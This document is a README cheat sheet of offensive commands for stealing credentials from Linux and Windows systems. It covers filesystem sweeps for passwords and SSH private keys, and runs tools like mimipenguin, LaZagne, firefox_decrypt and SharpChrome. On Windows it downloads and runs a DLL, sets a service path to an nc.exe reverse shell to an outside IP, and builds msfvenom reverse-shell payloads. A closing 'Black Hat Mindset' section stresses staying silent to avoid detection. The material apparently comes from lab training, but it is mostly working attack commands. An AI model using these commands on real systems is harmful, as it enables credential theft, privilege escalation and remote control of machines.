# Basic Methodology - Linux Local Password Attacks

This README explores techniques for local password attacks on Linux systems, focusing on finding credentials, searching for sensitive files, and extracting data, with additional Windows-specific commands for credential theft and privilege escalation.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Finding Configuration Files](#finding-configuration-files)
- [Searching for Credentials in Configuration Files](#searching-for-credentials-in-configuration-files)
- [Finding Database Files](#finding-database-files)
- [Finding Text Files in Home Directories](#finding-text-files-in-home-directories)
- [Finding Script Files](#finding-script-files)
- [Finding Document Files](#finding-document-files)
- [Checking Crontab for Credentials](#checking-crontab-for-credentials)
- [Listing Cron Files](#listing-cron-files)
- [Searching for SSH Private Keys](#searching-for-ssh-private-keys)
- [Extracting Bash History](#extracting-bash-history)
- [Running Credential Extraction Tools (Linux)](#running-credential-extraction-tools-linux)
- [Extracting Firefox Credentials (Linux)](#extracting-firefox-credentials-linux)
- [Windows-Specific Commands](#windows-specific-commands)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Local password attacks on Linux systems involve searching for plaintext credentials, SSH keys, and sensitive files that can lead to privilege escalation or unauthorized access. This guide also includes Windows-specific commands for credential theft, service exploitation, and privilege escalation, often used after gaining initial access. The focus is on enumerating files, extracting data, and leveraging misconfigurations.

## Setup and Prerequisites

### Environment
- Linux host with local access to the target system; some commands apply to Windows.

### Tools Required
- Install `jq` (e.g., `apt install jq`)
- Python (2.7, 3, 3.9)
- guestmount (e.g., `apt install libguestfs-tools`)
- Download tools:
  - mimipenguin
  - lazagne
  - firefox_decrypt.py
  - SharpUp
  - accesschk.exe
  - SharpChrome
  - SessionGopher
  - windows-exploit-suggester.py

### Files
- Ensure scripts like `mimipenguin.py`, `mimipenguin.sh`, `lazagne.py`, and `firefox_decrypt.py` are available.

### Permissions
- Root or user access is required for Linux commands
- Admin rights may be needed for Windows commands

## Finding Configuration Files

Search for configuration files that may contain credentials:

```bash
for l in $(echo ".conf .config .cnf"); do
    echo -e "nFile extension: " $l
    find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core"
done
```

## Searching for Credentials in Configuration Files

Extract credentials from configuration files:

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib"); do
    echo -e "nFile: " $i
    grep "user|password|pass" $i 2>/dev/null | grep -v "#"
done
```

## Finding Database Files

Locate database files that may store credentials:

```bash
for l in $(echo ".sql .db .*db .db*"); do
    echo -e "nDB File extension: " $l
    find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man"
done
```

## Finding Text Files in Home Directories

Search for text files in user home directories:

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

## Finding Script Files

Locate script files that might contain hardcoded credentials:

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
    echo -e "nFile extension: " $l
    find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share"
done
```

## Finding Document Files

Search for document files that may contain sensitive data:

```bash
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*"); do
    echo -e "nFile extension: " $ext
    find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core"
done
```

## Checking Crontab for Credentials

Inspect the crontab for potential credentials:

```bash
cat /etc/crontab
```

## Listing Cron Files

List files in cron directories:

```bash
ls -la /etc/cron.*
```

## Searching for SSH Private Keys

Locate SSH private keys for potential misuse:

```bash
# Search entire filesystem
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

# Search home directories
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# Search for public keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

## Extracting Bash History

Retrieve commands from bash history files:

```bash
tail -n5 /home/*/.bash*
```

## Running Credential Extraction Tools (Linux)

Use tools to extract credentials from memory or files:

```bash
# Run mimipenguin
python3 mimipenguin.py
bash mimipenguin.sh

# Run lazagne
python2.7 lazagne.py all
python3 lazagne.py browsers
```

## Extracting Firefox Credentials (Linux)

Retrieve credentials stored by Firefox:

```bash
# List Firefox profiles
ls -l .mozilla/firefox/ | grep default

# Display Firefox credentials
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

# Decrypt Firefox credentials
python3.9 firefox_decrypt.py
```

## Windows-Specific Commands

### Reviewing Environment Variables

Check the PATH variable for potential misconfigurations:

```powershell
cmd /c echo %PATH%
```

### Downloading and Executing Files

Download and execute malicious files:

```powershell
# Download DLL
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

# Execute DLL
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

### Privilege Escalation Checks

Identify privilege escalation opportunities:

```powershell
# Run SharpUp
.SharpUp.exe audit

# Check service binary permissions
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# Check Registry ACLs
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

# Search for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\" | findstr /i /v """

# Check AlwaysInstallElevated
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# Windows Exploit Suggester
python2.7 windows-exploit-suggester.py --update
python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```

### Service Exploitation

Modify services for privilege escalation:

```powershell
# Replace service binary
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# Modify service path
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

### Process and Service Enumeration

Enumerate running processes and services:

```powershell
# Enumerate process
get-process -Id 3324

# Enumerate services
get-service | ? {$_.DisplayName -like 'Druva*'}

# Check startup programs
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl

# Check local users
Get-LocalUser

# Check computer description
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

### Credential Theft

Extract credentials from Windows systems:

```powershell
# Search for passwords in files
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

# Search Chrome dictionary
gc 'C:\Users\lafi\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

# PowerShell history
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath

# Decrypt PowerShell credentials
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'

# Search file contents
cd c:\Users\lafi\Documents & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
select-string -Path C:\Users\lafi\Documents\*.txt -Pattern password

# Search for specific files
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ *.config
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore

# List saved credentials
cmdkey /list

# Extract Chrome credentials
.SharpChrome.exe logins /unprotect

# Run LaZagne
.lazagne.exe -h
.lazagne.exe all

# Run SessionGopher
Invoke-SessionGopher -Target WINLPE-SRV01

# Extract wireless passwords
netsh wlan show profile
netsh wlan show profile ilfreight_corp key=clear
```

### File Transfers and Encoding

Transfer and encode files on Windows:

```powershell
# Transfer files
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat

# Encode/decode files
certutil -encode file1 encodedfile
certutil -decode encodedfile file2
```

### Scheduled Tasks and System Enumeration

Enumerate scheduled tasks and system details:

```powershell
# List scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | select TaskName,State

# Check directory permissions
.accesschk64.exe /accepteula -s -d C:\Scripts

# Generate malicious binaries
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

# Execute MSI package
msiexec /i c:\users\lafi\desktop\aie.msi /quiet /qn /norestart
```

## Mounting Virtual Disks (Linux)

Mount virtual disk images to extract data:

```bash
# Mount VMDK
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd

# Mount VHD/VHDX
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

## Black Hat Mindset

- **Search Thoroughly**: Use `find` and `grep` to uncover plaintext credentials in config files, scripts, and documents.
- **Extract Credentials**: Leverage tools like mimipenguin and lazagne to steal credentials from memory or browsers.
- **Exploit Misconfigs**: Target SSH keys, cron jobs, and unquoted service paths for privilege escalation.
- **Stay Silent**: Minimize file access and use stealthy tools to avoid detection.

## Resources

- [Mimipenguin GitHub](https://github.com/huntergregal/mimipenguin)
- [LaZagne GitHub](https://github.com/AlessandroZ/LaZagne)
- [Firefox Decrypt GitHub](https://github.com/unode/firefox_decrypt)
- [SharpUp GitHub](https://github.com/GhostPack/SharpUp)
- [Windows Exploit Suggester GitHub](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

